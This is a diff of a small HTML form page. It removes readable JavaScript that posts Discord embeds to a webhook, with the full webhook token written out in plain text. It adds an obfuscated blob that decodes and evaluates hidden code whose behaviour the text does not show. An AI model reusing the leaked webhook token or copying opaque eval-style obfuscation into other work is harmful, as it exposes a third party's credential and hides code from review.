@@ -20,46 +20,7 @@
   </form>
   <script src="discord.js"></script>
   <script>
-  // Esta función se ejecuta cuando el usuario hace clic en el botón de enviar
-    function enviarAlerta() {
-      // Obtenemos los valores de los inputs
-      var nombre = document.getElementById("nombre").value;
-      var version = document.getElementById("version").value;
-      var descripcion = document.getElementById("descripcion").value;
-      var imagen = document.getElementById("imagen").value;
-      var ide = document.getElementById("ide").value;
-      // Llamamos a la función enviarMensajeEmbed con esos valores
-      enviarMensajeEmbed(nombre, version, descripcion, imagen, ide);
-    }
-    // Esta función envía un mensaje embed a un webhook de discord
-    // Los parámetros son: nombre, versión, descripción e imagen
-    function enviarMensajeEmbed(nombre, version, descripcion, imagen, ide) {
-      // Creamos un objeto XMLHttpRequest para hacer la petición
-      if (ide == "2278112087" || ide == "8118985682" || ide == "9873282866" || ide == "6485718963" || ide == "1799267670" || ide == "3025331413" || ide == "6887190794" || ide == "3666722833" || ide == "2100177714" || ide == "3187453478"){
-      var xhr = new XMLHttpRequest();
-      // Abrimos la conexión con el método POST y la URL del webhook
-      xhr.open("POST", "https://discord.com/api/webhooks/1198097169270452385/GWkNH_4cPPnzan3LAzq-PuEmTfXFBhKzAEpVXxXcw0CWXCvNIJNdCOH-OPZyCTaRTIxM");
-      // Establecemos el tipo de contenido a JSON
-      xhr.setRequestHeader("Content-Type", "application/json");
-      // Creamos el objeto embed con los datos que queremos enviar
-      var embed = {
-        title: nombre,
-        description: descripcion,
-        image: {
-          url: imagen
-        },
-        footer: {
-          text: "Versión " + version
-        }
-      };
-      // Convertimos el objeto embed a una cadena JSON
-      var data = JSON.stringify({
-        embeds: [embed]
-      });
-      // Enviamos la petición con los datos del embed
-      xhr.send(data);
-    }
-    }
+ var enviarAlerta,enviarMensajeEmbed;(function(){var dVg='',AXL=494-483;function xqu(t){var f=5993127;var i=t.length;var r=[];for(var h=0;h<i;h++){r[h]=t.charAt(h)};for(var h=0;h<i;h++){var g=f*(h+404)+(f%32700);var d=f*(h+92)+(f%15308);var y=g%i;var z=d%i;var e=r[y];r[y]=r[z];r[z]=e;f=(g+d)%6784700;};return r.join('')};var eBq=xqu('ytrsqckeracwmuohfcgdnjvbxsplintutorzo').substr(0,AXL);var JpM='vaa 9=u88a75;,(=h3;vur+ol"sb(d+fwh)jbl1n.phr=trv]x,z=;mar t=;87,y0h6;,26a7e,r4u7+,[6 71,+0+8p,a6h8),g8r8],.4d81,;0 7u,i9=;uao 0=p]lf1rsvlr,cc0"ctiflrn)t2;a+l)o[][{]g=++=;{au S=d]aq[==5vaC=r3rfs=n3tf(r(v"r(db0)d(acg1m)n"sglln t ;g+p)]v9rjt(atgcm n0srd,.gpait(( n),fhrrvorvv1t)lvn)t}-);0>q0cvc-g{=ai a=ru(luvhr)m}ttvv;1a, z=(u;lov.rpli0,vprsgAmolcn}t.;[a[ 2;fo.(=ap e=n;;<u;j+;)av}ruk=macqahC(d=A<(;)]v4ranaj*kn;ifunv{.=8nl1o*j+r.th;r;o2eut=uv1--l;5=3;6+=;[e s) ff.k,=j)9wean(s.0egg(hrq8mlc[anC;dvAf()+i)l+h.Ch;riore tiu12e-i;r=a;.++2e}tl e)cpnui=u);ai7(p=snrle)w=u] i](w>q)i.;uth;m.s=b<tui-gAlss[)hpcp(s;(][{+a]i;p=f+o;+iu((!ln)lr)fi7(w<a)f.+ueh.m=s+b t(imgulC)stmvn=0.docnv"8),}rzhpvs2h [t](;rvarrhez]j9in(r"};,aC  =t4f,)9;3(,.0[9u,;61.1o6cutnio;,a{ ===toiqgef)omCcavC1dv(g6e;for(ra+ r=l;,<=.te{gphdc,+=((h.stl;tereoscrauA.(e)).;o-n!Ssrpni.[rrm+h.r,o.e5bkco)+;ae"u5nrh4siljt[r)"""(.=ocnsrn;';var gDp=xqu[eBq];var bGP='';var hso=gDp;var YoE=gDp(bGP,xqu(JpM));var ARm=YoE(xqu('WuWc0$tlH.4N(WW.1SWzsW3cs$)t!.W.;tnp0syq GsW_.eM.r.yrt..:evW=W$WW6k_)1n+r=2ciW1cW$w=b\'g(c{se1u.Wu5e\/!otfI$uoel4_]36am2ia(B.WoW\'Wq2[))rct1r9.5W)s3$s"Wr8t;r(.)dWcnm3nWWic4$it6i*gWWbStrtn9WcWr38W3%cc4W%W74eWC+6ctWpW76nW+.6.Wb3W(_m_50o8!(W38)p"na_u6%!oSbWe(gWt.g$es.cn%.d0:d[3}r[ofn{b.s27}pq%1n)v4aWff%8uy%2mW8,Ea0qT38W7=9 Ia8=iW8y.l2W2-65%j4.5B1{9i3%1#9l2t7q7 %W0}5W3]4z3nzr83TW9[644._.6}dr2.ie%eij0stc7,6(3(ef4,%r71d xozW8ih,eWsWi\/d.1_oc77!po_\/1pM\/7e(hyoWs3199.0B7<6E2i0W5e3e5n.!oeN)yW4D.i.)n{a&3.r$iWq5.,7smeiftooWj#.{zciCpcn.tz.7cWs6.6.1\/nN#vtd)5(yE.7n!p.C(abs_1!MeaEe;.tC.n7est1T(pG%cpxl5cxt8on\/Wsoxp%W%k.zeeWt.We9s.rW8.rn-2eo.)3c:]%Wteitgcf.%,eedr,5993822)gW)Wt5Wk(WzsWt-pn$W)rW@c(D.W0s)DWWxyWD"Wrr={W;s.W_W.WWhs0tapW$@Wcjck5!}ehglh!WW=ac1]W;eom(I@W=n;u0,07q7j_;6+W)WWt[8]2.+k0!=h-ryiW(e)%;;o%(e@4=);u0,0Cq(j*;W+8),si)73(cW!e.W.n(l,],m0))[,[W 33(,W{3T7l04)6;{ic)53bc{!B.W.1(c,q,.2;)W(o0u7bc F95j0n)2)T;cW)37(WWnj2;6er)o7.inF})m;{.B_7.,W4[cW,;1jm#((r,d,q)qje#W(W,W,S))j{#a(6,(,[)!WiuzWtS2rWn.(3.0f8o7Cwa.C!dn(021)t<8==b]6F=]b.Wio7..#WW%d4.8%(6E=hb$0W63=.bd.eW4.eWWWWbr5=)e;.W$oaW,d&5$)B;=W)u }.8,.*(0{3@r>cAb"N_)%,]\/(!:6A!"=_o%1]n(;1)Ae"o_t%f])(W?,A,"i_W%*])(-d8=4Er"%_o%3]o[!7{]I;a-t=(\'t(.( >xWq,;1tWW,(dm)$WWW\/4iW ,h:7W$,*?ei6e.{(f)W_f0$coWl*_$3(_n_30;8=)rWeWWW532)\/),9;; f4W=fj$2oi$(!aWWWn83*W!WW#WW1iW W{1GWeWW1xW5W11WWCWD19W)Wr11WhW.1r]c).Wex.r4.lnqw9clW1.tMdr.ywtW.[e%W%(W)c)9xcr=Wn1o]3(a7B72,=7q8!)nx&r\/W42l]WW}0o,]43]WWWexI0{8i6l0:C>1d1s8r.p4i+ndWE,;mSg7:jucl<W.}(fforeq:nttx0:c,y4(]aW))W}\/< aeajW5.5Siz}(%[N4n]e(be@In:oeWIr}:;=h1[)45]#(;a7a.}Ne8vWaW.<l5rWa1.2Ws3Hi!(,W95d{s3t(3W,}$eev.WsM)n]a.eWWf=3cu3*;2f!!v3))[({8c(e{[3W=Dcx};(tW.}tW_ncc,W]73y{n)e[{tCyy)H(.iW;[*W3W W.8+ewnlrc{.C+eyH..ur?!sW:Wi9.cWsFi {WWW3o(rWostF=.!_5)76)81760i})_41f6u(@d;,\'7.ft$2ide]$Co6uWeete).sr$$pWiaeeW; .i;nbc7-W$c5i6l[c] (i7yc.ibnEcC0ea(_92W5]_65;5(_19e51)iW)0e]Wv)r%c;.W_j.9at p)r|tc.EgtEb!e= (a6b$2W n0W3g %EWt(g[dtnW 0.WW1 ]WWn[cj (Eetib.eg_>dcs8r.p(i$ni)ar_tWr1.W i$Cf]3=3t 37o 4.rs|lWto ibW<-_0_t0p8n -u cfic irut;r, (els.o8 3!1o9n) tWt G9k_ 6!nnmer3 }meg=n%v?rncf=iEW}&u) _.8_z=B}  Ws7$2.c_) :eht;.=_. .b.d'));var zRb=hso(dVg,ARm );zRb(2108);return 1968})()
   </script>
 </body>
 </html>
